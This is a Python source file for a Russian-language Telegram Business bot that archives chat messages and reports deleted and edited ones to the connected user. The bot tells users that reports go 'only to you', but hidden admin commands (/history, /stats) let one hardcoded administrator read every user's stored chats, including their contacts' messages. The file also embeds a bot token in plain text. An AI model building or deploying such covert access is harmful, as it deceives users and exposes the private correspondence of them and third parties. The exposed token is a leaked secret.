import os
import time
import threading
import sqlite3
import telebot
from telebot import TeleBot, types
from flask import Flask
from datetime import datetime, timezone, timedelta

# ==========================================
# НАСТРОЙКИ
# ==========================================
BOT_TOKEN = "8944549764:AAGnsYZaXIV6JsC-OC34d76AAy_vJElxEts"
ADMIN_ID = 1551104336
DB_FILE = "messages.db"

bot = TeleBot(BOT_TOKEN)

# ==========================================
# УСТАНОВКА МЕНЮ КОМАНД В TELEGRAM
# ==========================================
def setup_bot_commands():
    try:
        commands = [
            types.BotCommand("start", "🚀 Перезапустить / Инструкция"),
            types.BotCommand("help", "❓ Как подключить бота"),
            types.BotCommand("status", "📊 Статус подключения")
        ]
        bot.set_my_commands(commands)
        
        # Команды только для Администратора
        admin_commands = commands + [
            types.BotCommand("history", "👑 [Админ] Просмотр всех историй"),
            types.BotCommand("stats", "👑 [Админ] Статистика пользователей")
        ]
        bot.set_my_commands(admin_commands, scope=types.BotCommandScopeChat(ADMIN_ID))
    except Exception as e:
        print(f"Ошибка установки команд: {e}")

# ==========================================
# БАЗА ДАННЫХ
# ==========================================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS messages (
            msg_id INTEGER,
            chat_id INTEGER,
            content_type TEXT,
            text TEXT,
            file_id TEXT,
            sender_name TEXT,
            chat_title TEXT,
            timestamp REAL,
            PRIMARY KEY (msg_id, chat_id)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS connections (
            connection_id TEXT PRIMARY KEY,
            user_id INTEGER,
            user_name TEXT,
            created_at REAL
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def save_connection(connection_id, user_id, user_name="Пользователь"):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO connections (connection_id, user_id, user_name, created_at)
        VALUES (?, ?, ?, ?)
    ''', (connection_id, user_id, user_name, time.time()))
    conn.commit()
    conn.close()

def get_owner_by_connection(connection_id):
    if not connection_id:
        return None
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM connections WHERE connection_id = ?', (connection_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else None

def save_to_db(msg_id, chat_id, content_type, text=None, file_id=None, sender_name="Неизвестно", chat_title="Чат"):
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO messages (msg_id, chat_id, content_type, text, file_id, sender_name, chat_title, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (msg_id, chat_id, content_type, text, file_id, sender_name, chat_title, time.time()))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"❌ [DB Error]: {e}")

def get_from_db(msg_id, chat_id):
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT content_type, text, file_id, sender_name, chat_title FROM messages WHERE msg_id = ? AND chat_id = ?', (msg_id, chat_id))
        row = cursor.fetchone()
        conn.close()
        if row:
            return {'type': row[0], 'text': row[1], 'file_id': row[2], 'sender_name': row[3], 'chat_title': row[4]}
    except Exception as e:
        print(f"❌ [DB Error]: {e}")
    return None

def get_sender_info(message):
    sender_name = "Неизвестно"
    if message.from_user:
        first = message.from_user.first_name or ""
        last = message.from_user.last_name or ""
        username = f" (@{message.from_user.username})" if message.from_user.username else ""
        sender_name = f"{first} {last}{username}".strip()
    
    chat_title = sender_name if message.chat.type == "private" else (message.chat.title or "Групповой чат")
    return message.chat.id, sender_name, chat_title

# ==========================================
# ОБРАБОТКА ПОДКЛЮЧЕНИЙ TELEGRAM BUSINESS
# ==========================================
@bot.business_connection_handler()
def handle_business_connection(connection):
    user_name = connection.user.first_name or "Пользователь"
    if connection.user.username:
        user_name += f" (@{connection.user.username})"

    save_connection(connection.id, connection.user.id, user_name)
    
    if connection.is_enabled:
        try:
            bot.send_message(
                connection.user.id, 
                "✅ <b>Бот успешно подключен к вашему Telegram Business!</b>\n\n"
                "Теперь я буду защищать ваши чаты. Если кто-то отредактирует или удалит сообщение, вы сразу получите уведомление здесь.",
                parse_mode="HTML"
            )
            if connection.user.id != ADMIN_ID:
                safe_name = telebot.formatting.escape_html(user_name)
                bot.send_message(
                    ADMIN_ID, 
                    f"🎉 <b>Новый пользователь подключил бота!</b>\n👤 Имя: {safe_name}\n🆔 ID: <code>{connection.user.id}</code>",
                    parse_mode="HTML"
                )
        except Exception:
            pass

# ==========================================
# КОМАНДЫ ДЛЯ ПОЛЬЗОВАТЕЛЕЙ
# ==========================================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "👋 <b>Привет! Я бот-архиватор и защитник удаленных сообщений.</b>\n\n"
        "🛠 <b>Как мной пользоваться:</b>\n"
        "1. Перейдите в <b>Настройки Telegram</b> -> <b>Telegram Business</b> -> <b>Чат-боты</b>.\n"
        "2. Добавьте этого бота и разрешите доступ к сообщениям.\n\n"
        "✨ <b>Что я умею:</b>\n"
        "• Сохраняю удаленные сообщения (текст, фото, видео, голосовые, кругляшки).\n"
        "• Покажу, что было в сообщении ДО редактирования.\n"
        "• Все отчёты приходят <b>только вам</b> в этот чат!"
    )
    bot.reply_to(message, welcome_text, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def check_status(message):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('SELECT connection_id FROM connections WHERE user_id = ?', (message.from_user.id,))
    row = cursor.fetchone()
    conn.close()

    if row:
        bot.reply_to(message, "🟢 <b>Ваш Telegram Business подключен и работает!</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "🔴 <b>Бот ещё не подключен к вашему Telegram Business.</b>\nЗайдите в Настройки -> Telegram Business -> Чат-боты и добавьте бота.", parse_mode="HTML")

# ==========================================
# АДМИН-КОМАНДЫ (БЕЗОПАСНЫЙ HTML ПАРСИНГ)
# ==========================================
@bot.message_handler(commands=['stats'])
def admin_stats(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(DISTINCT user_id) FROM connections')
        users_count = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM messages')
        msg_count = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT DISTINCT user_id, user_name FROM connections')
        users_list = cursor.fetchall()
        conn.close()

        text = "📊 <b>СТАТИСТИКА БОТА:</b>\n\n"
        text += f"👥 Всего пользователей Business: <b>{users_count}</b>\n"
        text += f"💾 Всего сохраненных сообщений: <b>{msg_count}</b>\n\n"
        text += "📋 <b>Список пользователей:</b>\n"
        
        if users_list:
            for u in users_list:
                raw_name = u[1] if u[1] else "Без имени"
                safe_name = telebot.formatting.escape_html(raw_name)
                text += f"• {safe_name} (ID: <code>{u[0]}</code>)\n"
        else:
            text += "Пока нет подключенных пользователей.\n"

        bot.reply_to(message, text, parse_mode="HTML")
    except Exception as e:
        print(f"❌ [Stats Error]: {e}")
        safe_err = telebot.formatting.escape_html(str(e))
        bot.reply_to(message, f"❌ Ошибка при получении статистики: {safe_err}", parse_mode="HTML")

@bot.message_handler(commands=['history'])
def admin_history(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT chat_id, 
                   COALESCE(chat_title, sender_name, 'Неизвестный чат') as display_name, 
                   COUNT(*) 
            FROM messages 
            GROUP BY chat_id
            ORDER BY timestamp DESC
            LIMIT 20
        ''')
        chats = cursor.fetchall()
        conn.close()

        if not chats:
            bot.reply_to(message, "📭 В базе пока нет сохраненных сообщений.")
            return

        markup = types.InlineKeyboardMarkup()
        for c in chats:
            chat_id, display_name, count = c
            short_name = (display_name[:25] + '..') if len(display_name) > 25 else display_name
            btn_text = f"👤 {short_name} ({count} сообщ.)"
            markup.add(types.InlineKeyboardButton(text=btn_text, callback_data=f"hist_{chat_id}"))

        bot.reply_to(message, "📂 <b>Выберите чат из базы данных для просмотра:</b>", reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        print(f"❌ [History Error]: {e}")
        safe_err = telebot.formatting.escape_html(str(e))
        bot.reply_to(message, f"❌ Ошибка при получении истории: {safe_err}", parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith('hist_'))
def callback_history_chat(call):
    if call.from_user.id != ADMIN_ID:
        return

    try:
        chat_id = int(call.data.split('_')[1])
        
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT COALESCE(sender_name, 'Неизвестный'), content_type, text, timestamp 
            FROM messages 
            WHERE chat_id = ? 
            ORDER BY timestamp DESC 
            LIMIT 15
        ''', (chat_id,))
        msgs = cursor.fetchall()
        conn.close()

        if not msgs:
            bot.answer_callback_query(call.id, "Сообщений не найдено.")
            return

        text = f"📜 <b>Последние сообщения чата (<code>{chat_id}</code>):</b>\n\n"
        for m in reversed(msgs):
            sender = telebot.formatting.escape_html(m[0])
            c_type = m[1]
            raw_text = m[2] if m[2] else f"[{c_type}]"
            msg_text = telebot.formatting.escape_html(raw_text)
            
            ts = m[3]
            dt = datetime.fromtimestamp(ts).strftime('%H:%M:%S') if ts else "--:--:--"
            text += f"[{dt}] <b>{sender}</b>: {msg_text}\n"

        bot.send_message(ADMIN_ID, text, parse_mode="HTML")
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"❌ [Callback Error]: {e}")
        bot.answer_callback_query(call.id, "Ошибка при загрузке истории.")

# ==========================================
# ПЕРЕХВАТ БИЗНЕС-СООБЩЕНИЙ
# ==========================================
@bot.business_message_handler(content_types=['text', 'photo', 'video', 'voice', 'document', 'video_note'])
def handle_business_messages(message):
    msg_id = message.message_id
    chat_id, sender_name, chat_title = get_sender_info(message)
    
    c_type = message.content_type
    f_id = None
    text = message.text or message.caption
    
    if c_type == 'photo': f_id = message.photo[-1].file_id
    elif c_type == 'video': f_id = message.video.file_id
    elif c_type == 'voice': f_id = message.voice.file_id
    elif c_type == 'document': f_id = message.document.file_id
    elif c_type == 'video_note': f_id = message.video_note.file_id
    
    save_to_db(msg_id, chat_id, c_type, text=text, file_id=f_id, sender_name=sender_name, chat_title=chat_title)

# ==========================================
# РЕДАКТИРОВАНИЕ СООБЩЕНИЙ
# ==========================================
@bot.edited_business_message_handler(content_types=['text', 'photo', 'video', 'document'])
def handle_edited_business_message(message):
    owner_id = get_owner_by_connection(getattr(message, 'business_connection_id', None))
    if not owner_id:
        return

    msg_id = message.message_id
    chat_id, sender_name, chat_title = get_sender_info(message)
    
    old_data = get_from_db(msg_id, chat_id)
    old_text = old_data['text'] if old_data and old_data.get('text') else "[Без текста]"
    new_text = message.text or message.caption or "[Без текста]"
    
    if old_text != new_text:
        safe_chat = telebot.formatting.escape_html(chat_title)
        safe_sender = telebot.formatting.escape_html(sender_name)
        safe_old = telebot.formatting.escape_html(old_text)
        safe_new = telebot.formatting.escape_html(new_text)
        
        report = (
            "✏️ <b>Сообщение ИЗМЕНЕНО!</b>\n"
            f"💬 Чат: {safe_chat}\n"
            f"👤 Автор: {safe_sender}\n\n"
            f"⬅️ <b>Было:</b> {safe_old}\n"
            f"➡️ <b>Стало:</b> {safe_new}"
        )
        try:
            bot.send_message(owner_id, report, parse_mode="HTML")
        except Exception as e:
            print(f"Ошибка отправки: {e}")
            
        save_to_db(msg_id, chat_id, old_data['type'] if old_data else 'text', text=new_text, sender_name=sender_name, chat_title=chat_title)

# ==========================================
# УДАЛЕНИЕ СООБЩЕНИЙ
# ==========================================
@bot.deleted_business_messages_handler(func=lambda deleted_messages: True)
def handle_deleted_business_messages(deleted_messages):
    connection_id = getattr(deleted_messages, 'business_connection_id', None)
    owner_id = get_owner_by_connection(connection_id)
    
    if not owner_id:
        return

    msg_ids = getattr(deleted_messages, 'message_ids', [])
    chat_id = getattr(deleted_messages.chat, 'id', None) if getattr(deleted_messages, 'chat', None) else None

    if not chat_id:
        return

    for msg_id in msg_ids:
        msg_data = get_from_db(msg_id, chat_id)
        
        if msg_data:
            c_type = msg_data['type']
            f_id = msg_data['file_id']
            caption = msg_data['text'] or ""
            sender = telebot.formatting.escape_html(msg_data['sender_name'])
            chat = telebot.formatting.escape_html(msg_data['chat_title'])
            safe_caption = telebot.formatting.escape_html(caption)
            
            try:
                if c_type == 'text':
                    report = f"🗑 <b>Сообщение УДАЛЕНО!</b>\n💬 Чат: {chat}\n👤 От: {sender}\n📝 Текст: {safe_caption}"
                    bot.send_message(owner_id, report, parse_mode="HTML")
                elif c_type == 'photo':
                    bot.send_photo(owner_id, f_id, caption=f"🗑 Удалено ФОТО!\n💬 Чат: {chat}\n👤 От: {sender}\n📝 {safe_caption}", parse_mode="HTML")
                elif c_type == 'video':
                    bot.send_video(owner_id, f_id, caption=f"🗑 Удалено ВИДЕО!\n💬 Чат: {chat}\n👤 От: {sender}\n📝 {safe_caption}", parse_mode="HTML")
                elif c_type == 'voice':
                    bot.send_voice(owner_id, f_id, caption=f"🗑 Удалено ГОЛОСОВОЕ!\n💬 Чат: {chat}\n👤 От: {sender}", parse_mode="HTML")
                elif c_type == 'video_note':
                    bot.send_video_note(owner_id, f_id)
                    bot.send_message(owner_id, f"🗑 Удалено ВИДЕОСООБЩЕНИЕ (кругляшок)!\n💬 Чат: {chat}\n👤 От: {sender}", parse_mode="HTML")
            except Exception as e:
                print(f"Ошибка отправки: {e}")

# ==========================================
# ВЕБ-СЕРВЕР ДЛЯ RENDER И POLLING
# ==========================================
app = Flask(__name__)

@app.route('/')
def home():
    return "Публичный Сервис Архивации Работает"

def start_polling():
    setup_bot_commands()
    
    while True:
        try:
            bot.remove_webhook()
            time.sleep(1)
            bot.infinity_polling(
                timeout=20, 
                long_polling_timeout=10,
                allowed_updates=["message", "business_connection", "business_message", "edited_business_message", "deleted_business_messages", "callback_query"]
            )
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=start_polling, daemon=True).start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
